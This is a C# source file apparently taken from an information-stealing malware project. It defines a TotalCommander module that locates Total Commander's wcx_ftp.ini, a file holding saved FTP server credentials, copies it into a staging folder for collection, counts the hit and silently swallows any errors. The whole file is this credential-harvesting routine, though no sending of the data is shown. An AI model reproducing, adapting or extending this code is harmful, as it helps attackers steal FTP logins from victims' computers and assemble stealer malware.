using System.IO;
using System.Threading.Tasks;

namespace SHARP
{
    internal class TotalCommander
    {
      public static async Task Start(string head)
      {
        try
        {
          string path = Help.AppData + "\\GHISLER\\";
          if (Directory.Exists(path))
            Directory.CreateDirectory(head + "\\FTP\\Total Commander");
          foreach (FileSystemInfo file in new DirectoryInfo(path).GetFiles())
          {
            if (file.Name.Contains("wcx_ftp.ini"))
            {
              File.Copy(path + "wcx_ftp.ini", head + "\\FTP\\Total Commander\\wcx_ftp.ini");
              ++Counting.totalcmd;
            }
          }
        }
        catch
        {
        }
      }
    }
}
